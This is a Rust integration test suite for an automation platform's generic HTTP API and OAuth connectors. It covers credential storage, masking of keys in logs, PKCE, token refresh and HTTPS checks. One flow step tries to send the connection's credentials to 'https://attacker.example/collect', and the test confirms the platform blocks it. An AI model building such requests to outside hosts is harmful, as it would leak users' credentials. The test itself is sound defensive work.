//! "Any app (HTTP API)" through the real API: a connection to an arbitrary REST API stores only the fields its
//! sign-in type uses, a flow calls the app with the connection's credentials, and the run log never shows them.

use serde_json::json;
use wiremock::{
    Mock, MockServer, ResponseTemplate,
    matchers::{method, path, query_param},
};

use crate::harness::TestApp;

#[tokio::test]
async fn any_app_connects_with_its_own_credentials_and_a_flow_calls_it() {
    let app = TestApp::spawn().await;
    let api = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/v2/ping"))
        .and(query_param("apikey_x", "K-123"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({"ok": true})))
        .mount(&api)
        .await;
    Mock::given(method("POST"))
        .and(path("/v2/tickets"))
        .and(query_param("apikey_x", "K-123"))
        .respond_with(ResponseTemplate::new(201).set_body_json(json!({"ticket": 55})))
        .mount(&api)
        .await;
    let (status, cxn) = app
        .req(
            "POST",
            "/api/v1/connections",
            Some(json!({"connector": "http_api", "name": "Helpdesk",
                "fields": {"base_url": format!("{}/v2", api.uri()), "auth": "api_key_query", "query_name": "apikey_x",
                    "api_key": "K-123", "token": "ignored-bearer", "test_path": "/ping"}})),
        )
        .await;
    assert_eq!(status.as_u16(), 201, "{cxn}");
    assert_eq!(cxn["status"], "active", "the connection test passed: {cxn}");
    assert!(
        cxn["config"].get("header_name").is_none(),
        "fields of other sign-in types are not stored: {cxn}"
    );
    let id = cxn["id"].as_str().unwrap();
    let flow = app
        .live_flow("Open ticket", json!({"trigger": {"type": "manual"}, "steps": [
            {"key": "ticket", "type": "action", "connector": "http_api", "action": "api_call", "connection_id": id,
                "input": {"method": "POST", "path": "/tickets", "body": {"subject": "{{ trigger.subject }}"}}}
        ]}))
        .await;
    let r = app
        .ok(
            "POST",
            &format!("/api/v1/flows/{}/run", flow["id"].as_str().unwrap()),
            Some(json!({"payload": {"subject": "Printer jam"}})),
        )
        .await;
    app.drain().await;
    let exe = r["execution_id"].as_str().unwrap();
    let run = app
        .ok("GET", &format!("/api/v1/executions/{exe}"), None)
        .await;
    assert_eq!(run["status"], "succeeded", "{run}");
    assert_eq!(run["steps"][0]["output"]["body"]["ticket"], 55);
    let log = app
        .ok("GET", &format!("/api/v1/executions/{exe}/log"), None)
        .await;
    assert!(
        !log.to_string().contains("K-123"),
        "the connection's key never reaches the log: {log}"
    );
    assert!(log.to_string().contains("apikey_x=***"), "{log}");
    // A path may not send the credentials to another host.
    let bad = app
        .live_flow("Leak", json!({"trigger": {"type": "manual"}, "steps": [
            {"key": "x", "type": "action", "connector": "http_api", "action": "api_call", "connection_id": id,
                "input": {"method": "GET", "path": "https://attacker.example/collect"}}
        ]}))
        .await;
    let r = app
        .ok(
            "POST",
            &format!("/api/v1/flows/{}/run", bad["id"].as_str().unwrap()),
            Some(json!({"payload": {}})),
        )
        .await;
    app.drain().await;
    let run = app
        .ok(
            "GET",
            &format!("/api/v1/executions/{}", r["execution_id"].as_str().unwrap()),
            None,
        )
        .await;
    assert_eq!(run["status"], "failed");
    assert_eq!(run["error_code"], "app.invalid_input");
    app.cleanup().await;
}

/// The value of `key` in a URL's query (percent-decoded).
pub(crate) fn param(url: &str, key: &str) -> String {
    let query = url.split_once('?').map_or("", |(_, q)| q);
    let raw = query
        .split('&')
        .find_map(|pair| pair.strip_prefix(&format!("{key}=")))
        .unwrap_or_else(|| panic!("no {key} in {url}"));
    percent_decode(raw)
}

fn percent_decode(raw: &str) -> String {
    let bytes = raw.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 2 < bytes.len() => {
                let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).unwrap();
                out.push(u8::from_str_radix(hex, 16).unwrap());
                i += 3;
            }
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8(out).unwrap()
}

#[tokio::test]
async fn any_app_signs_in_with_its_own_oauth_client_and_refreshes_with_it() {
    use wiremock::matchers::{body_string_contains, header};
    let app = TestApp::spawn().await;
    let api = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/oauth/token"))
        .and(body_string_contains("grant_type=authorization_code"))
        .and(body_string_contains("client_id=my-client"))
        .and(body_string_contains("client_secret=my-secret"))
        .and(body_string_contains("code_verifier="))
        .respond_with(ResponseTemplate::new(200).set_body_json(
            json!({"access_token": "at-1", "refresh_token": "rt-1", "expires_in": 3600, "token_type": "Bearer"}),
        ))
        .expect(1)
        .mount(&api)
        .await;
    Mock::given(method("POST"))
        .and(path("/oauth/token"))
        .and(body_string_contains("grant_type=refresh_token"))
        .and(body_string_contains("refresh_token=rt-1"))
        .and(body_string_contains("client_secret=my-secret"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_json(json!({"access_token": "at-2", "expires_in": 3600})),
        )
        .expect(1)
        .mount(&api)
        .await;
    Mock::given(method("GET"))
        .and(path("/api/me"))
        .and(header("authorization", "Bearer at-1"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({"name": "Acme"})))
        .mount(&api)
        .await;
    // The app revokes at-1 before the flow runs; at-2 works.
    Mock::given(method("GET"))
        .and(path("/api/orders"))
        .and(header("authorization", "Bearer at-1"))
        .respond_with(ResponseTemplate::new(401))
        .mount(&api)
        .await;
    Mock::given(method("GET"))
        .and(path("/api/orders"))
        .and(header("authorization", "Bearer at-2"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({"orders": [1, 2]})))
        .mount(&api)
        .await;
    let return_to = "http://app.weft.test/connections/callback";
    let (status, started) = app
        .req(
            "POST",
            "/api/v1/connections/oauth/start",
            Some(
                json!({"connector": "http_oauth", "name": "Shop", "return_to": return_to,
                "fields": {"base_url": format!("{}/api", api.uri()),
                    "authorize_url": format!("{}/oauth/authorize", api.uri()),
                    "token_url": format!("{}/oauth/token", api.uri()),
                    "client_id": "my-client", "client_secret": "my-secret",
                    "scopes": "orders.read offline_access", "test_path": "/me"}}),
            ),
        )
        .await;
    assert_eq!(status.as_u16(), 200, "{started}");
    let url = started["authorize_url"].as_str().unwrap();
    assert!(
        url.starts_with(&format!("{}/oauth/authorize?", api.uri())),
        "{url}"
    );
    assert_eq!(param(url, "client_id"), "my-client");
    assert_eq!(param(url, "scope"), "orders.read offline_access");
    assert_eq!(
        param(url, "redirect_uri"),
        "http://weft.test/oauth/callback"
    );
    assert!(
        !url.contains("my-secret"),
        "the secret never goes to the browser"
    );
    assert!(url.contains("code_challenge="), "PKCE by default");
    let state = param(url, "state");
    let back = app
        .redirect(&format!("/oauth/callback?state={state}&code=code-1"))
        .await;
    let finish_token = param(&back, "finish");
    let (status, done) = app
        .req(
            "POST",
            "/api/v1/connections/oauth/finish",
            Some(json!({"state": state, "finish": finish_token})),
        )
        .await;
    assert_eq!(status.as_u16(), 200, "{done}");
    let id = done["connection_id"].as_str().unwrap();
    let cxn = app
        .ok("GET", &format!("/api/v1/connections/{id}"), None)
        .await;
    assert_eq!(
        cxn["status"], "active",
        "the connection test used the new token: {cxn}"
    );
    assert!(!cxn.to_string().contains("my-secret"), "{cxn}");
    let flow = app
        .live_flow("Orders", json!({"trigger": {"type": "manual"}, "steps": [
            {"key": "orders", "type": "action", "connector": "http_oauth", "action": "api_call", "connection_id": id,
                "input": {"method": "GET", "path": "/orders"}}
        ]}))
        .await;
    let r = app
        .ok(
            "POST",
            &format!("/api/v1/flows/{}/run", flow["id"].as_str().unwrap()),
            Some(json!({"payload": {}})),
        )
        .await;
    app.drain().await;
    let run = app
        .ok(
            "GET",
            &format!("/api/v1/executions/{}", r["execution_id"].as_str().unwrap()),
            None,
        )
        .await;
    assert_eq!(run["status"], "succeeded", "{run}");
    assert_eq!(run["steps"][0]["output"]["body"]["orders"], json!([1, 2]));
    api.verify().await;
    app.cleanup().await;
}

#[tokio::test]
async fn any_app_sign_in_needs_https_addresses_and_its_client_secret() {
    let app = TestApp::spawn().await;
    let start = |fields: serde_json::Value| json!({"connector": "http_oauth", "name": "Shop", "return_to": "http://app.weft.test/connections/callback", "fields": fields});
    let base = json!({"base_url": "https://api.example.com", "authorize_url": "http://example.com/authorize",
        "token_url": "https://example.com/token", "client_id": "c", "client_secret": "s"});
    let (status, body) = app
        .req(
            "POST",
            "/api/v1/connections/oauth/start",
            Some(start(base.clone())),
        )
        .await;
    assert_eq!(status.as_u16(), 422, "plain http off this machine: {body}");
    let mut no_secret = base;
    no_secret["authorize_url"] = json!("https://example.com/authorize");
    no_secret["client_secret"] = json!("");
    let (status, body) = app
        .req(
            "POST",
            "/api/v1/connections/oauth/start",
            Some(start(no_secret)),
        )
        .await;
    assert_eq!(status.as_u16(), 422, "{body}");
    assert!(body.to_string().contains("client secret"), "{body}");
    app.cleanup().await;
}

#[tokio::test]
async fn editing_an_any_app_connection_asks_only_for_the_credentials_its_sign_in_uses() {
    use wiremock::matchers::header;
    let app = TestApp::spawn().await;
    let api = MockServer::start().await;
    for (prefix, token) in [("/v1", "t1"), ("/v2", "t2")] {
        Mock::given(method("GET"))
            .and(path(format!("{prefix}/ping")))
            .and(header("authorization", format!("Bearer {token}").as_str()))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({"ok": true})))
            .mount(&api)
            .await;
    }
    let cxn = app
        .ok(
            "POST",
            "/api/v1/connections",
            Some(json!({"connector": "http_api", "name": "API",
                "fields": {"base_url": format!("{}/v1", api.uri()), "auth": "bearer", "token": "t1", "test_path": "/ping"}})),
        )
        .await;
    let id = cxn["id"].as_str().unwrap();
    // A new address needs the token again, and only the token (not the API key or password of other sign-ins).
    let (status, body) = app
        .req(
            "PATCH",
            &format!("/api/v1/connections/{id}"),
            Some(json!({"fields": {"base_url": format!("{}/v2", api.uri())}})),
        )
        .await;
    assert_eq!(status.as_u16(), 422, "{body}");
    let detail = body["detail"].as_str().unwrap_or_default();
    assert!(
        detail.contains("Token") && !detail.contains("Password") && !detail.contains("API key"),
        "{body}"
    );
    // The edit sends only what changed: the stored `auth = bearer` decides that the token applies.
    let (status, body) = app
        .req(
            "PATCH",
            &format!("/api/v1/connections/{id}"),
            Some(json!({"fields": {"base_url": format!("{}/v2", api.uri()), "token": "t2"}})),
        )
        .await;
    assert_eq!(status.as_u16(), 200, "{body}");
    let test = app
        .ok("POST", &format!("/api/v1/connections/{id}/test"), None)
        .await;
    assert_eq!(
        test["ok"], true,
        "the new address with the new token: {test}"
    );
    app.cleanup().await;
}
